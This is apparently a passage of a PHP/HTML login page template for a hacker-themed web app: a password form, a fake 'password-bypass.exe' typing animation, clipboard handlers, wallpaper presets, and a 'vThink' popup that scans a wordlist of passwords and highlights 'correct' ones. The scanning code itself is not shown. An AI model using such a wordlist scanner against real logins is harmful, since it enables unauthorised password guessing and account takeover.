    <link rel="icon" type="image/svg+xml" href="favicon.svg">
    <script>
    (function(){
      var svg = "<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><circle cx='12' cy='12' r='9' fill='none' stroke='Chartreuse' stroke-width='3' opacity='0.28'/><path d='M6 12a6 6 0 1 1 12 0' fill='none' stroke='#e6eef7' stroke-width='3' stroke-linecap='round'/><circle cx='12' cy='12' r='2' fill='Chartreuse'/><circle cx='12' cy='12' r='9' fill='none' stroke='Chartreuse' stroke-width='3' stroke-linecap='round' stroke-dasharray='56' stroke-dashoffset='42'/></svg>";
      var url = 'data:image/svg+xml;utf8,' + encodeURIComponent(svg);
      var link = document.createElement('link');
      link.setAttribute('rel','icon');
      link.setAttribute('type','image/svg+xml');
      link.setAttribute('href', url);
      document.head.appendChild(link);
    })();
    </script>
    <script>
    (function(){
        function handleLogoutClick(e){
            e.preventDefault(); e.stopPropagation();
            try {
                var el = e.currentTarget;
                var href = (el && el.href) ? el.href : (window.location.pathname + '?logout=1');
                if (typeof window.spawnConfirmWindow === 'function') {
                    window.spawnConfirmWindow({
                        message: 'Are you sure you want logout now?',
                        anchor: el,
                        onYes: function(){ window.location.href = href; },
                        onNo: function(){}
                    });
                } else {
                    if (window.confirm('Are you sure you want logout now?')) { window.location.href = href; }
                }
            } catch(_){ try { window.location.href = '?logout=1'; } catch(__){} }
            return false;
        }
        function init(){
            try {
                var hdr = document.getElementById('logout-trigger');
                var term = document.querySelector('.term-action.term-logout');
                if (hdr) hdr.addEventListener('click', handleLogoutClick, { capture:true });
                if (term) term.addEventListener('click', handleLogoutClick, { capture:true });
            } catch(_){ }
        }
        if (document.readyState === 'loading') { document.addEventListener('DOMContentLoaded', init); } else { init(); }
    })();
    </script>

    
    <script>
    (function(){ 'use strict';
      var ctx = document.getElementById('ctx-menu');
      var pasteTpl = document.getElementById('paste-template');
      var pasteArea = document.getElementById('paste-area');
      var currentTarget = null;
      function showCtxMenu(x, y){ ctx.style.left = (x+2)+'px'; ctx.style.top = (y+2)+'px'; ctx.classList.add('show'); ctx.setAttribute('aria-hidden','false'); }
      function hideCtxMenu(){ ctx.classList.remove('show'); ctx.setAttribute('aria-hidden','true'); }
      function openPaste(){ /* paste popup removed */ }
      // Expose target setter only
      try { window.setPasteTarget = function(el){ currentTarget = el; }; } catch(e){}
      document.addEventListener('contextmenu', function(e){ var t=e.target; var inInput=t&&(t.tagName==='INPUT'||t.tagName==='TEXTAREA'||t.isContentEditable); if(inInput) return; var inCmd = !!(t && t.closest('.cmd-window')); if(!inCmd) return; e.preventDefault(); currentTarget=t; showCtxMenu(e.clientX,e.clientY); });
      document.addEventListener('click', function(e){ if(!ctx.contains(e.target)) hideCtxMenu(); });
      document.getElementById('ctx-copy').addEventListener('click', function(){ hideCtxMenu(); try{ var sel=window.getSelection(); if(!sel||String(sel).length===0){ var r=document.createRange(); r.selectNode(document.body); sel.removeAllRanges(); sel.addRange(r);} document.execCommand('copy'); }catch(e){} });
      document.getElementById('ctx-select').addEventListener('click', function(){ hideCtxMenu(); try{ var r=document.createRange(); r.selectNode(document.body); var sel=window.getSelection(); sel.removeAllRanges(); sel.addRange(r);}catch(e){} });
      document.getElementById('ctx-paste').addEventListener('click', async function(){ hideCtxMenu(); try{ var txt=''; if (navigator.clipboard && navigator.clipboard.readText) { txt = await navigator.clipboard.readText(); } txt = String(txt||''); if (!txt) return; var el=currentTarget; var winEl = (window.activeCmdWin) || (el ? el.closest('.cmd-window') : (document.querySelector('.cmd-window.show') || document.querySelector('.cmd-window'))); if (winEl && winEl.doPaste) { winEl.doPaste(txt); return; } var inputEl = document.querySelector('.cmd-input'); if (inputEl) { inputEl.value += txt; return; } }catch(e){} });
      document.getElementById('ctx-paste-oneline').addEventListener('click', async function(){ hideCtxMenu(); try{ var txt=''; if (navigator.clipboard && navigator.clipboard.readText) { txt = await navigator.clipboard.readText(); } else { txt = ''; } txt = String(txt||'').replace(/[\r\n]+/g,' ').replace(/\s+/g,' ').trim(); if (!txt) return; var winEl = currentTarget && currentTarget.closest('.cmd-window'); if (winEl && winEl.doPaste) { winEl.doPaste(txt); return; } var inputEl = document.querySelector('.cmd-input'); if (inputEl) { inputEl.value += txt; return; } }catch(e){} });
      // paste popup removed — no button handlers
      document.getElementById('ctx-copy-command').addEventListener('click', function(){ hideCtxMenu(); try{ var winEl = currentTarget && currentTarget.closest('.cmd-window'); var typed = winEl ? winEl.querySelector('.cmd-live .cmd-typed') : document.querySelector('.cmd-live .cmd-typed'); var t = typed ? (typed.textContent||'') : ''; if (!t) return; var ta = document.createElement('textarea'); ta.style.position='fixed'; ta.style.opacity='0'; ta.value=t; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta); }catch(e){} });
      document.getElementById('ctx-open').addEventListener('click', function(){ hideCtxMenu(); var a=currentTarget&&currentTarget.closest('a'); if(a&&a.href){ window.open(a.href,'_blank'); } });
      // Global shortcuts outside inputs
      document.addEventListener('keydown', async function(e){ var mac=/Mac/i.test(navigator.platform||''); var ctrl=mac?e.metaKey:e.ctrlKey; var t=e.target; var inInput=t&&(t.tagName==='INPUT'||t.tagName==='TEXTAREA'||t.isContentEditable); if(!ctrl||inInput) return; var k=(e.key||'').toLowerCase(); if(k==='a'){ e.preventDefault(); var r=document.createRange(); r.selectNode(document.body); var sel=window.getSelection(); sel.removeAllRanges(); sel.addRange(r); } else if(k==='c'){ e.preventDefault(); try{ document.execCommand('copy'); }catch(e){} } else if(k==='v'){ e.preventDefault(); try{ var txt=''; if (navigator.clipboard && navigator.clipboard.readText) { txt = await navigator.clipboard.readText(); } txt = String(txt||''); if (!txt) return; var winEl = (window.activeCmdWin) || (document.querySelector('.cmd-window.show') || document.querySelector('.cmd-window')); if (winEl && winEl.doPaste) { winEl.doPaste(txt); return; } var inputEl = document.querySelector('.cmd-input'); if (inputEl) { inputEl.value += txt; return; } }catch(e){} } });
      // Removed paste popup keyboard handler
    })();
    </script>
    <!-- Sync login wallpaper with saved selection before styles render -->
    <script>
    (function(){
      try {
        // Presets mirrored from main app so type mapping works here too
        var PRESET_MAC = 'https://images7.alphacoders.com/139/thumb-1920-1393184.png';
        var PRESET_OLD = 'https://images4.alphacoders.com/136/thumb-1920-1361673.png';
        var PRESET_TYPE3 = [
          'radial-gradient(420px 420px at 18% 28%, rgba(64,200,64,0.35), rgba(64,200,64,0) 60%)',
          'radial-gradient(360px 360px at 74% 58%, rgba(90,230,90,0.30), rgba(90,230,90,0) 60%)',
          'radial-gradient(260px 260px at 42% 78%, rgba(40,180,80,0.28), rgba(40,180,80,0) 60%)',
          'linear-gradient(180deg, #041907 0%, #09310f 58%, #0a4e16 100%)'
        ].join(', ');
        var PRESET_TYPE4 = 'https://images5.alphacoders.com/398/thumb-1920-398599.jpg';
        var PRESET_TYPE5 = 'https://images.alphacoders.com/132/thumb-1920-1321753.jpeg';
        var PRESET_TYPE6 = 'https://images6.alphacoders.com/601/thumb-1920-601846.jpg';
        var PRESET_TYPE7 = 'https://images.alphacoders.com/127/thumb-1920-1275722.jpg';
        var PRESET_TYPE8 = 'https://images2.alphacoders.com/581/thumb-1920-581799.jpg';
        var PRESET_TYPE9 = 'https://images8.alphacoders.com/137/thumb-1920-1372177.jpeg';
        var PRESET_TYPE10 = 'https://images2.alphacoders.com/132/thumb-1920-1323478.jpeg';
        var PRESET_TYPE11 = 'https://images8.alphacoders.com/135/thumb-1920-1358903.png';
        var PRESET_TYPE12 = 'https://images3.alphacoders.com/133/thumb-1920-1338606.png';
        var PRESET_TYPE13 = 'https://images7.alphacoders.com/567/thumb-1920-567918.png';
        var PRESET_TYPE14 = 'https://images2.alphacoders.com/137/thumb-1920-1377396.png';
        var PRESET_TYPE15 = 'https://images5.alphacoders.com/338/thumb-1920-338822.jpg';
        var PRESET_TYPE16 = 'https://images4.alphacoders.com/407/thumb-1920-40726.jpg';
        var PRESET_TYPE17 = 'https://images4.alphacoders.com/138/thumb-1920-1382307.png';
        var PRESET_TYPE18 = 'https://images3.alphacoders.com/132/thumb-1920-1328396.png';
        var PRESET_TYPE19 = 'https://images5.alphacoders.com/526/thumb-1920-526887.jpg';
        var PRESET_TYPE20 = 'https://images2.alphacoders.com/135/thumb-1920-1355112.jpeg';
        var PRESET_TYPE21 = 'https://images7.alphacoders.com/134/thumb-1920-1341150.png';
        var PRESET_TYPE22 = 'https://images4.alphacoders.com/136/thumb-1920-1360883.jpeg';
        var PRESET_TYPE23 = 'https://images5.alphacoders.com/528/thumb-1920-528725.jpg';
        var PRESET_TYPE24 = 'https://images2.alphacoders.com/132/thumb-1920-1325726.png';
        var fallbackWallpaper = <?= json_encode($wallpaperUrl) ?>;
        var type = localStorage.getItem('coding.wallpaper.type') || '';
        var saved = localStorage.getItem('coding.wallpaper');
        var chosen = null;
        switch(type){
          case 'type1': chosen = PRESET_MAC; break;
          case 'type2': chosen = PRESET_OLD; break;
          case 'type3': chosen = PRESET_TYPE3; break;
          case 'type4': chosen = PRESET_TYPE4; break;
          case 'type5': chosen = PRESET_TYPE5; break;
          case 'type6': chosen = PRESET_TYPE6; break;
          case 'type7': chosen = PRESET_TYPE7; break;
          case 'type8': chosen = PRESET_TYPE8; break;
          case 'type9': chosen = PRESET_TYPE9; break;
          case 'type10': chosen = PRESET_TYPE10; break;
          case 'type11': chosen = PRESET_TYPE11; break;
          case 'type12': chosen = PRESET_TYPE12; break;
          case 'type13': chosen = PRESET_TYPE13; break;
          case 'type14': chosen = PRESET_TYPE14; break;
          case 'type15': chosen = PRESET_TYPE15; break;
          case 'type16': chosen = PRESET_TYPE16; break;
          case 'type17': chosen = PRESET_TYPE17; break;
          case 'type18': chosen = PRESET_TYPE18; break;
          case 'type19': chosen = PRESET_TYPE19; break;
          case 'type20': chosen = PRESET_TYPE20; break;
          case 'type21': chosen = PRESET_TYPE21; break;
          case 'type22': chosen = PRESET_TYPE22; break;
          case 'type23': chosen = PRESET_TYPE23; break;
          case 'type24': chosen = PRESET_TYPE24; break;
          case 'custom': chosen = saved; break;
          default: break;
        }
        if (!type && !saved) { chosen = PRESET_TYPE24; }
        var value = chosen || saved || fallbackWallpaper;
        if (value){
          var isGradient = /^\s*(?:linear|radial)-gradient\(/.test(value);
          var cssValue = isGradient ? value : "url('" + value.replace(/'/g, "\\'") + "')";
          document.documentElement.style.setProperty('--wallpaper', cssValue);
        }
      } catch(e){}
    })();
    </script>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Rounded:opsz,wght,FILL,GRAD@20..48,500,1,0" />
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;500;700&family=Ubuntu+Mono:wght@400;700&display=swap" />
        <style>
            :root { --text:#e8f0f7; --border:rgba(255,255,255,0.08); --bg: #0b0c10; --wallpaper: url('<?= h($wallpaperUrl) ?>'); --wallpaperFallback: radial-gradient(1200px 600px at 10% 10%, #0b0b0b 0%, #0a0c10 45%, #0a0c10 100%); }
            body { margin:0; background:#000; color:var(--text); font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace; display:flex; flex-direction:column; min-height:100vh; align-items:center; justify-content:center; font-size: var(--textBase); line-height: 1.5; }
            /* Wallpaper background matching the main app */
            body::before { content:""; position:fixed; inset:0; background-image: var(--wallpaper), var(--wallpaperFallback); background-size: cover, cover; background-position: center, center; background-repeat: no-repeat, no-repeat; background-attachment: fixed, fixed; z-index:-1; }
            /* Laptop-style status bar at the top showing current time */
            .status-bar { position:fixed; top:0; left:0; right:0; height:32px; display:flex; align-items:center; justify-content:flex-end; padding:0 14px; background: rgba(46,49,57,0.35); backdrop-filter: blur(8px) saturate(120%); border-bottom:1px solid var(--border); z-index: 10; }
            .status-bar .status-time { color:#e8f0f7; font-size:13px; font-weight:600; letter-spacing:0.3px; }
            /* Simple centered notch to evoke laptop camera area */
.status-bar .notch { position:absolute; left:50%; transform:translateX(-50%); width:90px; height:18px; background: transparent; border-radius:0 0 9px 9px; box-shadow: none; display:none; }
            /* Right-top tools inside status bar */
            .status-tools { display:flex; align-items:center; gap:8px; }
.status-icon { width:26px; height:26px; border-radius:8px; border:1px solid var(--border); display:inline-flex; align-items:center; justify-content:center; background: rgba(255,255,255,0.04); color:#cfd6df; cursor:default; }
.status-icon:hover { background: rgba(255,255,255,0.08); }
/* vThink header icon: Chartreuse circle with black '?' icon */
#vthink-trigger { background: Chartreuse; color:#000000; border-color: var(--border); }
#vthink-trigger:hover { background: Chartreuse; border-color: var(--border); }
#vthink-trigger .material-symbols-rounded { color:#000000; font-size:18px; }
            
            .status-app-label { display:inline-flex; align-items:center; height:26px; padding:0 6px; border-radius:10px; border:1px solid var(--border); background: rgba(255,255,255,0.04); color:#e8f0f7; font-size:12px; font-weight:600; letter-spacing:0.4px; }
            .status-lang { display:inline-flex; align-items:center; justify-content:center; height:26px; padding:0 8px; border-radius:10px; border:1px solid var(--border); background: rgba(255,255,255,0.04); color:#e8f0f7; font-size:12px; font-weight:600; letter-spacing:0.6px; }
            .status-search { display:inline-flex; align-items:center; justify-content:center; gap:0; height:26px; width:26px; padding:0; border-radius:8px; border:1px solid var(--border); background: rgba(255,255,255,0.04); overflow:hidden; cursor:text; }
            .status-search.active { width:auto; gap:6px; padding:0 8px; border-radius:12px; }
            .status-search input { display:none; width:0; background:transparent; border:0; outline:none; color:#e8f0f7; font-size:12px; opacity:0; transition: width .2s ease, opacity .2s ease; }
            .status-search.active input { display:block; width:120px; opacity:1; }
            .status-search .material-symbols-rounded { font-size:18px; color:#cfd6df; }
            /* (Removed) Header APPtools icon styling */
            .login-card { width: 460px; max-width: 92vw; padding: 18px 18px 22px; border:1px solid var(--border); border-radius: 12px; background: transparent; backdrop-filter: none; box-shadow: none; text-align:center; }
            .login-icons { display:flex; align-items:center; justify-content:center; gap:10px; color:#b6bec8; margin-bottom:12px; }
            .material-symbols-rounded { font-variation-settings: 'FILL' 1, 'wght' 500, 'GRAD' 0, 'opsz' 24; }
            .login-icons .material-symbols-rounded { font-size:22px; cursor:default; }
            /* Center big clock */
            .hero-time { display:flex; align-items:center; justify-content:center; margin: 28px 0 10px; }
            .hero-date { text-align:center; font-size: 20px; font-weight: 600; letter-spacing: 0.5px; color: rgba(255,255,255,0.85); text-shadow: 0 1px 2px rgba(0,0,0,0.35); font-family: 'Ubuntu', 'Segoe UI', Arial, sans-serif; }
            .hero-date::after { content:""; display:block; width: 120px; height: 12px; margin: 8px auto 0; background: rgba(255,255,255,0.18); border-radius: 6px; box-shadow: 0 1px 8px rgba(0,0,0,0.25); }
            .hero-clock { font-size: 72px; font-weight: 800; letter-spacing: 1px; line-height: 1; font-family: 'Ubuntu', 'Segoe UI', Arial, sans-serif; color: transparent; background: linear-gradient(to bottom, rgba(255,255,255,0.95), rgba(255,255,255,0.70) 60%, rgba(255,255,255,0.40)); -webkit-background-clip: text; background-clip: text; -webkit-text-stroke: 3px rgba(255,255,255,0.18); text-shadow: 0 4px 16px rgba(0,0,0,0.42), 0 1px 0 rgba(255,255,255,0.60) inset; filter: drop-shadow(0 4px 8px rgba(0,0,0,0.42)); opacity: 0.88; }
            .input-pill { display:flex; align-items:center; gap:10px; padding:10px 16px; border:1px solid var(--border); border-radius:9999px; background: rgba(46,49,57,0.28); backdrop-filter: blur(8px) saturate(120%); box-shadow: inset 0 1px 0 rgba(255,255,255,0.08), 0 6px 14px rgba(0,0,0,0.25); color:#cbd5e1; max-width: 380px; margin: 0 auto; }
        .input-pill .material-symbols-rounded { font-size:18px; color:#cbd5e1; }
            .input-pill input { flex:1; background: transparent; border:0; outline:none; color:var(--text); font-size: var(--textBase); padding:6px 2px; }
            .notice { background: rgba(46, 139, 87, 0.10); border:1px solid rgba(46, 139, 87, 0.28); color:#d7f7e7; padding:10px 14px; border-radius:8px; margin:14px auto; max-width:640px; display:flex; align-items:center; justify-content:center; gap:8px; text-align:center; box-shadow: 0 6px 14px rgba(0,0,0,0.35); }
        /* Make password input a bit smaller */
        .input-pill input[type="password"] { font-size:14px; line-height:1.2; padding:4px 1px; }
        .input-pill input::placeholder { color:#9aa3af; }
            .form-actions { margin-top:14px; text-align:center; }
            .icon-action { width:30px; height:30px; border-radius:15px; border:1px solid var(--border); display:inline-flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; margin:0 6px; vertical-align:middle; }
            .icon-action:hover { background: rgba(255,255,255,0.06); }
            .icon-action .material-symbols-rounded { font-size:22px; }
            .icon-action.icon-confirm .material-symbols-rounded { color: Chartreuse; }
            .error { background:#3a1f1f; border:1px solid #6a2b2b; color:#f7d7d7; padding:8px 10px; border-radius:6px; margin:12px auto; display:flex; align-items:center; justify-content:center; gap:8px; text-align:center; width:fit-content; }
            .error .material-symbols-rounded { color:#f7d7d7; font-size:20px; }
            /* Fullscreen overlay for terminal animation */
            .overlay-terminal { position: fixed; inset: 0; background: rgba(8,10,12,0.35); backdrop-filter: blur(8px) saturate(120%); display:none; align-items:center; justify-content:center; z-index: 9999; }
            .overlay-terminal.show { display:flex; }
            .terminal-modal { width: 560px; max-width: 92vw; border-radius: 12px; border:1px solid rgba(255,255,255,0.08); background: rgba(10,12,16,0.22); backdrop-filter: blur(6px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.35); color:#cfd6df; }
            .terminal-modal .titlebar { display:flex; align-items:center; padding:10px 12px; border-bottom:1px solid rgba(255,255,255,0.08); background: rgba(10,12,16,0.35); border-radius:12px 12px 0 0; }
            .terminal-modal .titlebar .traffic { margin-right:10px; }
            .terminal-modal .title { flex:1; text-align:center; font-weight:600; letter-spacing:0.2px; }
            .terminal-modal .title .material-symbols-rounded { font-size:20px; color: Chartreuse; vertical-align:-4px; }
            .terminal-modal .title svg { width:20px; height:20px; vertical-align:-4px; margin-right:6px; }
            .terminal-modal .titlebar .term-close { margin-left:8px; border:1px solid var(--border); background: transparent; color:#cfd6df; width:26px; height:26px; border-radius:13px; display:inline-flex; align-items:center; justify-content:center; cursor:pointer; }
            .terminal-modal .titlebar .term-close:hover { background: rgba(255,255,255,0.06); }
            .terminal-modal .body { padding:16px; font-family: 'Courier New', 'Monaco', 'Menlo', monospace; background: rgba(10,12,16,0.18); border-radius: 0 0 12px 12px; }
            .terminal-modal .output { min-height: 120px; white-space: pre-wrap; color: Chartreuse; }
            .terminal-modal .cursor { display:inline-block; width:10px; background: Chartreuse; animation: blink 1s steps(1) infinite; vertical-align: -2px; }
            /* Error theme for terminal overlay */
            .overlay-terminal.error-theme .terminal-modal .title .material-symbols-rounded { color:#ff6b6b; }
            .overlay-terminal.error-theme .terminal-modal .output { color:#ff6b6b; }
            .overlay-terminal.error-theme .terminal-modal .cursor { background:#ff6b6b; }
            @keyframes blink { 50% { opacity:0; } }
            /* vThink app popup */
            .vthink-window { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 560px; max-width: 92vw; border-radius: 12px; border:1px solid var(--border); background: rgba(10,12,16,0.22); backdrop-filter: blur(6px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.35); color:#cfd6df; display:none; z-index: 9998; }
            .vthink-window.show { display:block; }
            .vthink-titlebar { display:flex; align-items:center; padding:10px 12px; border-bottom:1px solid rgba(255,255,255,0.08); background: rgba(10,12,16,0.35); border-radius:12px 12px 0 0; }
            .vthink-title { flex:1; text-align:center; font-weight:600; letter-spacing:0.2px; }
            .vthink-close { margin-left:8px; border:1px solid rgba(139,0,0,0.55); background: transparent; color:DarkRed; width:28px; height:28px; border-radius:50%; display:inline-flex; align-items:center; justify-content:center; cursor:pointer; }
            .vthink-close .material-symbols-rounded { color:DarkRed; }
            .vthink-close:hover { background: rgba(139,0,0,0.12); border-color: rgba(139,0,0,0.75); }
            .vthink-body { padding:16px; font-family: 'Courier New', 'Monaco', 'Menlo', monospace; background: rgba(10,12,16,0.18); border-radius: 0 0 12px 12px; }
            .vthink-output { min-height: 160px; white-space: pre-wrap; font-size:14px; line-height:1.35; }
            .vthink-output .cmd { color: Chartreuse; }
            .vthink-output .err { color:#ff6b6b; }
            .vthink-output .ok { color: Chartreuse; }
            .vthink-output .cursor { display:inline-block; width:10px; background: Chartreuse; animation: blink 1s steps(1) infinite; vertical-align: -2px; }
            /* Selected effect for correct passwords */
            .vthink-selected { background: Chartreuse; color:#000 !important; border-radius:4px; padding:0 4px; }
            .vthink-selected .ok { color:#000 !important; }
.vthink-controls { display:flex; flex-direction: column; gap:8px; margin-bottom:12px; align-items:center; }
            .vthink-controls label { font-size:12px; color:#cfd6df; opacity:0.9; }
.vthink-list { width:90%; max-width:440px; min-height:100px; border:1px solid var(--border); border-radius:8px; background: rgba(10,12,16,0.28); color:#e8f0f7; padding:8px; font-family:'Courier New','Monaco','Menlo',monospace; font-size:14px; line-height:1.35; margin:0 auto; display:block; }
            .vthink-scan { align-self:center; border:1px solid var(--border); background: rgba(255,255,255,0.04); color:#cfd6df; height:28px; padding:0 10px; border-radius:8px; cursor:pointer; display:inline-flex; align-items:center; gap:6px; }
            .vthink-scan .material-symbols-rounded { color: Chartreuse; font-size:18px; }
            .vthink-scan:hover { background: rgba(255,255,255,0.08); }
            /* Circular checkbox for Remember me */
            .remember-me input[type="checkbox"] {
                width: 16px; height: 16px; margin: 0;
                -webkit-appearance: none; appearance: none;
                border: 1px solid var(--border);
                border-radius: 50%;
                background: rgba(255,255,255,0.04);
                display: inline-block; position: relative;
                cursor: pointer;
            }
            .remember-me input[type="checkbox"]:hover { background: rgba(255,255,255,0.08); }
            .remember-me input[type="checkbox"]:focus { outline: none; box-shadow: 0 0 0 2px rgba(154,205,50,0.35); }
            .remember-me input[type="checkbox"]:checked {
                background: Chartreuse; border-color: Chartreuse;
            }
            .remember-me input[type="checkbox"]:checked::after {
                content: ""; position: absolute; width: 6px; height: 6px;
                border-radius: 50%; background: #000;
                top: 50%; left: 50%; transform: translate(-50%, -50%);
            }
            </style>
        </head>
        <body>
        <div class="status-bar" aria-label="Laptop status bar">
            <div class="notch" aria-hidden="true" style="z-index:9"></div>
            <div class="status-tools" aria-label="Login header tools">
                <!-- Header audio control: click to reveal volume slider -->
                <button class="status-icon" id="header-audio-toggle" type="button" title="Volume" aria-label="Volume">
                    <span class="material-symbols-rounded" id="header-audio-icon" aria-hidden="true">volume_up</span>
                </button>
                <div class="audio-popover" id="header-audio-popover" hidden>
                    <input type="range" id="header-audio-volume" min="0" max="100" step="1" value="60" aria-label="Volume">
                </div>
                <!-- vThink app trigger -->
                <button class="status-icon" id="vthink-trigger" type="button" title="vThink" aria-label="vThink">
                    <span class="material-symbols-rounded" aria-hidden="true">help</span>
                </button>
                <span class="status-lang" title="Language">ABC</span>
                <div class="status-search" role="search" aria-label="Search">
                    <span class="material-symbols-rounded" aria-hidden="true">search</span>
                    <input type="text" placeholder="Search" aria-label="Search" />
                </div>
            </div>
        </div>
        <div class="hero-date" id="hero-date" aria-label="Current date"></div>
        <div class="hero-time" aria-label="Current time">
            <span class="hero-clock" id="hero-clock"></span>
        </div>
        <?php /* notice removed from body to avoid duplicate notifications; success stays in popup */ ?>
        <form method="post" class="login-card" autocomplete="off">
            <div class="login-icons">
                <span class="material-symbols-rounded" aria-hidden="true">account_circle</span>
            </div>
            <?php /* Replaced inline error pill with terminal-style overlay animation for failures */ ?>
            <input type="hidden" name="do_login" value="1">
            <div class="input-pill" style="margin-top:10px;">
                <span class="material-symbols-rounded">password</span>
                <input type="password" name="password" placeholder="Enter password" autofocus>
            </div>
            <?php /* Debug hint removed to prevent leaking password or source info */ ?>
            <p class="form-actions">
                <button id="login-submit" class="icon-action icon-confirm" type="submit" title="Login"><span class="material-symbols-rounded">fingerprint</span></button>
            </p>
        </form>
        <!-- Background audio removed per user request -->
        <div class="overlay-terminal" id="terminal-overlay" role="dialog" aria-modal="true" aria-label="Connecting">
            <div class="terminal-modal" role="document">
                <div class="titlebar">
                    <div class="traffic">
                        <span class="dot red"></span>
                        <span class="dot yellow"></span>
                        <span class="dot green"></span>
                    </div>
                    <div class="title"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 48 48" aria-hidden="true"><rect width="14" height="7" x="17" y="8" fill="#999"></rect><path fill="#666" d="M43,8H31v7h14v-5C45,8.895,44.105,8,43,8z"></path><path fill="#ccc" d="M5,8c-1.105,0-2,0.895-2,2v5h14V8H5z"></path><linearGradient id="u8UbA7GmcDgkSbOtELVhra_WbRVMGxHh74X_t1" x1="3.594" x2="44.679" y1="13.129" y2="39.145" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#4c4c4c"></stop><stop offset="1" stop-color="#343434"></stop></linearGradient><path fill="url(#u8UbA7GmcDgkSbOtELVhra_WbRVMGxHh74X_t1)" d="M45,13H3v25c0,1.105,0.895,2,2,2h38c1.105,0,2-0.895,2-2V13z"></path><path d="M10.889,18.729l-2.197,2.197c-0.352,0.352-0.352,0.924,0,1.276l4.271,4.271l-4.325,4.325c-0.352,0.352-0.352,0.924,0,1.276l2.197,2.197c0.353,0.352,0.924,0.352,1.276,0l7.16-7.161c0.352-0.352,0.352-0.924,0-1.276l-7.106-7.106C11.813,18.376,11.242,18.376,10.889,18.729z" opacity=".07"></path></svg> --zsh</div>
                    <button class="term-close" id="term-close-btn" title="Close" aria-label="Close"><span class="material-symbols-rounded" aria-hidden="true">cancel</span></button>
                </div>
                <div class="body">
                    <div class="output" id="term-output">$ </div>
                </div>
            </div>
        </div>
        <!-- vThink popup template and layer -->
        <div class="vthink-window" id="vthink-template" role="dialog" aria-label="vThink" style="display:none;">
            <div class="vthink-titlebar">
                <div class="vthink-title">vThink</div>
                <button class="vthink-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">cancel</span></button>
            </div>
            <div class="vthink-body">
                <div class="vthink-controls">
                    <label for="vthink-list">Wordlist (one password per line)</label>
                    <textarea id="vthink-list" class="vthink-list" placeholder="admin\nAdmin\nAdmin123\n..." rows="6"></textarea>
                    <button class="vthink-scan" id="vthink-scan" type="button"><span class="material-symbols-rounded">play_arrow</span>Scan</button>
                </div>
                <div class="vthink-output" id="vthink-output">$ <span class="cursor"></span></div>
            </div>
        </div>
        <div id="vthink-layer"></div>
        <script>
            (function(){
              // Use saved wallpaper if present; otherwise apply the default
              try {
                var desired = '<?= h($wallpaperUrl) ?>';
                var type = localStorage.getItem('coding.wallpaper.type') || '';
                var savedWp = localStorage.getItem('coding.wallpaper');
                var type3Val = [
                  'radial-gradient(420px 420px at 18% 28%, rgba(64,200,64,0.35), rgba(64,200,64,0) 60%)',
                  'radial-gradient(360px 360px at 74% 58%, rgba(90,230,90,0.30), rgba(90,230,90,0) 60%)',
                  'radial-gradient(260px 260px at 42% 78%, rgba(40,180,80,0.28), rgba(40,180,80,0) 60%)',
              'linear-gradient(180deg, #041907 0%, #09310f 58%, #0a4e16 100%)'
                ].join(', ');
                var type4Val = 'https://images5.alphacoders.com/398/thumb-1920-398599.jpg';
                var useVal = (type === 'type2') ? 'https://images4.alphacoders.com/136/thumb-1920-1361673.png'
                            : (type === 'type3') ? type3Val
                            : (type === 'type4') ? type4Val
                            : (savedWp ? savedWp : desired);
                var isGradient = /^\s*(?:linear|radial)-gradient\(/.test(useVal);
                var cssVal = isGradient ? useVal : "url('" + useVal.replace(/'/g, "\\'") + "')";
                /* wallpaper already set earlier; do not override */
              } catch(e) {}
              function fmtClock(date){
                return date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
              }
              function fmtDate(date){
                // Mon 3 Nov
                return date.toLocaleDateString([], { weekday: 'short', day: 'numeric', month: 'short' });
              }
              function tick(){
                var now = new Date();
                var clockEl = document.getElementById('hero-clock');
                var dateEl = document.getElementById('hero-date');
                if (clockEl) clockEl.textContent = fmtClock(now);
                if (dateEl) dateEl.textContent = fmtDate(now);
              }
              tick();
              setInterval(tick, 1000); // update every second for real-time clock

              // Terminal-style connect animation (5s first time, 2s second time)
              var trigger = null; // account_circle icon is decorative only
              var overlay = document.getElementById('terminal-overlay');
              var output = document.getElementById('term-output');
              var pwInput = document.querySelector('input[name="password"]');
              var serverError = <?= json_encode($error ?? '') ?>;

              function typeText(text, cb, speed){
                var i = 0;
                speed = speed || 40;
                function step(){
                  output.textContent += text.charAt(i);
                  i++;
                  if (i < text.length){
                    setTimeout(step, speed);
                  } else {
                    if (typeof cb === 'function') cb();
                  }
                }
                step();
              }

              function animateConnect(autoSubmit){
                overlay.classList.add('show');
                output.textContent = 'C:\\> ';
                var start = Date.now();
                // Determine duration: faster (~1s total) if user has seen animation before
                var fast = false;
                try { fast = localStorage.getItem('loginSeen') === '1'; } catch(e) {}
                var connectMs = fast ? 400 : 5000; // dots stage
                var typeSpeed1 = fast ? 10 : 40;   // first typing speed
                var typeSpeed2 = fast ? 15 : 50;   // second typing speed
                var postDelay = fast ? 150 : 600;  // delay to close overlay
                typeText('password-bypass.exe', function(){
                  output.textContent += '\n';
                  typeText('connecting ', function(){
                    var dots = 0;
                    var dotTimer = setInterval(function(){
                      dots = (dots + 1) % 4; // 0..3
                      var base = 'C:\\> password-bypass.exe\nconnecting ';
                      output.textContent = base + '.'.repeat(dots);
                    }, 300);
                    setTimeout(function(){
                      clearInterval(dotTimer);
                      output.textContent = 'C:\\> password-bypass.exe\nconnecting .... done';
                      setTimeout(function(){
                        overlay.classList.remove('show');
                        // Mark that user has seen the animation so next time is faster
                        try { localStorage.setItem('loginSeen', '1'); } catch(e) {}
                        if (autoSubmit && formRef) {
                          formRef.submit();
                        } else if (pwInput) {
                          pwInput.focus();
                        }
                      }, postDelay);
                    }, connectMs);
                  }, typeSpeed2);
                }, typeSpeed1);
              }

              // Icon is non-interactive; no click behavior

              // Run animation before form submission (button click or Enter key)
